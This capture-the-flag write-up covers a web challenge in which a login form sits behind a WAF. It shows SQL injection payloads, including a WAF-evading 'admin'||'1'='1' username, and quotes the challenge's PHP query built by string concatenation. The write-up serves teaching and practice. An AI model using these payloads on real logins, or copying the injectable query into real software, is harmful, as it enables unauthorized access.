# Hard login
Category: Web

## Description
> Part 2 of Imperva's challenge
> 
> Do you know SQL? Can you think outside the box? Does WAF scare you?
> 

## Solution

The [previous challenge](JS_rocks.md)'s flag has left us with a hint: `can_you_bypass_the_login`.

The description talks about an SQL injection.

So, let's try the basics:
```
Username: ' or 1=1 -- 
Password: test
```

However, the WAF blocks us:
```
Access denied
Error 15
www.vulnet.zone
2020-12-17 20:03:12 UTC
What happened?
This request was blocked by the security rules
```

After some trial and error, we finally arrive to the following input:
```
Username: admin'||'1'='1
Password: test
```

We log into a bug bounty platform and get the flag: `cstechnion{the_company_likes_cookies}`.

The flag is a hint for the [next challenge](JS_and_HTML_are_best_friends.md).

Bonus: One of the challenges in the series allows us to dump the source code for the website. The vulnerable code is:
```php
$sql = "SELECT id, username, avatar, password FROM Users WHERE username ='".$username."' AND password = '".hash("sha512", $password)."'";
// echo $sql;
$result = mysqli_query($conn,$sql);
if(mysqli_num_rows($result)!=0) {
    session_start();
    // Store data in session variables
    $value = $result->fetch_array(MYSQLI_ASSOC);
    $_SESSION["loggedin"] = true;
    $_SESSION["id"] = $value["id"];
    $_SESSION["username"] = $username;
    $_SESSION["avatar"] = $value["avatar"];
    if (preg_match("/['\"|&(`]/i", $username)){
        $_SESSION["auth_bypass_flag"] = "cstechnion{the_company_likes_cookies}";
    }
```